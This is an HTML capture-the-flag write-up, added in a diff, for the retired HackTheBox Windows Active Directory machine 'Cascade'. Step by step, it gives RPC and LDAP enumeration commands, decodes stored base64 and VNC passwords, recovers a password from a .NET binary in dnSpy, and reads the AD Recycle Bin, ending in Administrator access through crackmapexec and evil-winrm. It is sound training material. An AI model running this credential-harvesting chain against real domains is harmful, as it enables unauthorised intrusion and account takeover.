@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cascade &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Cascade</h1>
+    <div class="meta">Target: <code>10.10.10.182</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">ActiveDirectory</span><span class="tag">RPC</span><span class="tag">LDAP</span><span class="tag">VNC</span><span class="tag">WinRM</span><span class="tag">SQLite</span><span class="tag">dnSpy</span><span class="tag">ADRecycleBin</span><span class="tag">Base64</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#r-thompson-vnc-password-s-smith">r.thompson → VNC Password → s.smith</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#s-smith-dnspy-arksvc">s.smith → dnSpy → arksvc</a><a class="lvl3" href="#arksvc-ad-recycle-bin-administrator">arksvc → AD Recycle Bin → Administrator</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Cascade is a medium Windows Active Directory box and one of the better "credentials lead to more credentials" chains on HTB. There's no exploit anywhere, every step is enumeration and credential recovery: an LDAP-stored legacy password, an encrypted VNC password with a hardcoded key, a .NET binary reverse-engineered in dnSpy to recover a database password, and finally the <strong>AD Recycle Bin</strong>, where a deleted admin account still carries the password that owns the domain.</p>
+<blockquote>
+<p><strong>Screenshot would help here:</strong> the <code>CascAudit.exe</code> step is done in <strong>dnSpy</strong>, setting a breakpoint and reading a decrypted value at runtime. A screenshot of dnSpy paused on that line would make the reverse-engineering step far clearer than prose.</p>
+</blockquote>
+<h2 id="recon">Recon</h2>
+<p>Anonymous SMB connected but listed no shares. When SMB null sessions come up empty, the next stop is RPC, which was open:</p>
+<pre><code class="language-sh">rpcclient -U '' -N 10.10.10.182
+rpcclient $&gt; enumdomusers
+user:[arksvc] user:[s.smith] user:[r.thompson] user:[BackupSvc] ...
+</code></pre>
+<blockquote>
+<p><strong>Why RPC after SMB:</strong> even with no readable shares, <code>rpcclient</code> can often enumerate domain users over the same null session. That user list becomes the spray/target set for everything downstream.</p>
+</blockquote>
+<p>LDAP was also queryable anonymously. Dumping person objects surfaced a non-standard attribute on <code>r.thompson</code>:</p>
+<pre><code class="language-sh">ldapsearch -h 10.10.10.182 -x -b &quot;DC=cascade,DC=local&quot; '(objectClass=person)'
+cascadeLegacyPwd: clk0bjVldmE=
+</code></pre>
+<blockquote>
+<p><strong><code>cascadeLegacyPwd</code></strong> is a custom attribute the admins added to store a password, base64-encoded, which is encoding, not encryption. Decoding it is instant:</p>
+</blockquote>
+<pre><code class="language-sh">echo clk0bjVldmE= | base64 -d   -&gt;   ‹redacted›
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="r-thompson-vnc-password-s-smith">r.thompson → VNC Password → s.smith</h3>
+<p>Those creds failed over WinRM but worked for SMB. The <code>data</code> share held <code>VNC Install.reg</code> containing an encrypted VNC password:</p>
+<pre><code>&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f
+</code></pre>
+<blockquote>
+<p><strong>Why VNC passwords are trivially reversible:</strong> VNC encrypts the stored password with a <em>fixed, publicly known</em> DES key. Tools like <code>vncpwd</code> just decrypt it. It's obfuscation, not security.</p>
+</blockquote>
+<pre><code class="language-sh">echo '6bcf2a4b6e5aca0f' | xxd -r -p &gt; vnc_enc_pass
+/opt/vncpwd/vncpwd vnc_enc_pass   -&gt;   Password: ‹redacted›
+</code></pre>
+<p>That password belonged to <strong>s.smith</strong>, and this one <em>did</em> work over WinRM:</p>
+<pre><code class="language-sh">crackmapexec winrm 10.10.10.182 -u s.smith -p ‹redacted›   -&gt;   (Pwn3d!)
+evil-winrm -u s.smith -p ‹redacted› -i 10.10.10.182
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="s-smith-dnspy-arksvc">s.smith → dnSpy → arksvc</h3>
+<p><code>s.smith</code> belonged to the "Audit Share" group, granting access to the <code>Audit$</code> share. It contained <code>Audit.db</code> (SQLite), <code>CascAudit.exe</code>, and <code>RunAudit.bat</code>:</p>
+<pre><code>CascAudit.exe &quot;\\CASC-DC1\Audit$\DB\Audit.db&quot;
+</code></pre>
+<p>The SQLite data was base64 that wouldn't decode, encrypted. So I loaded <code>CascAudit.exe</code> into <strong>dnSpy</strong>. The binary opens the DB, reads the <code>Ldap</code> table, and decrypts a password in code. Setting a breakpoint where the SQL connection closes and running it with a copy of <code>Audit.db</code> revealed the plaintext:</p>
+<pre><code>arksvc : ‹redacted›
+</code></pre>
+<pre><code class="language-sh">crackmapexec winrm 10.10.10.182 -u arksvc -p ‹redacted›   -&gt;   (Pwn3d!)
+</code></pre>
+<h3 id="arksvc-ad-recycle-bin-administrator">arksvc → AD Recycle Bin → Administrator</h3>
+<p><code>arksvc</code> is a member of <strong>AD Recycle Bin</strong>.</p>
+<blockquote>
+<p><strong>Why that group is the win:</strong> when an AD object is deleted, it isn't immediately purged, it's tombstoned in the Recycle Bin, <em>retaining its attributes</em>. Members of the AD Recycle Bin group can read deleted objects. If a now-deleted account had a password stored in <code>cascadeLegacyPwd</code>, it's still there.</p>
+</blockquote>
+<p>Querying deleted objects turned up a <code>TempAdmin</code> account (referenced earlier in an HTML file) with the legacy attribute set:</p>
+<pre><code class="language-powershell">Get-ADObject -filter { SAMAccountName -eq &quot;TempAdmin&quot; } -includeDeletedObjects -property *
+cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz
+</code></pre>
+<pre><code class="language-sh">echo YmFDVDNyMWFOMDBkbGVz | base64 -d   -&gt;   ‹redacted›
+</code></pre>
+<p><code>TempAdmin</code>'s password was reused by the real <strong>Administrator</strong>:</p>
+<pre><code class="language-sh">crackmapexec winrm 10.10.10.182 -u administrator -p ‹redacted›   -&gt;   (Pwn3d!)
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">evil-winrm -u administrator -p ‹redacted› -i 10.10.10.182
+</code></pre>
+<p>Box rooted.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>When SMB null gives no shares, pivot to RPC and LDAP.</strong> Both leaked the user list and the first password here.</li>
+<li><strong>VNC stored passwords use a fixed key</strong>, recoverable instantly with <code>vncpwd</code>.</li>
+<li><strong>Reverse the binary when the data is encrypted.</strong> dnSpy turned an opaque SQLite blob into a working credential.</li>
+<li><strong>AD Recycle Bin retains attributes of deleted objects</strong>, including legacy passwords, and admins reuse them. That chain of reuse is what ultimately owned the domain.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
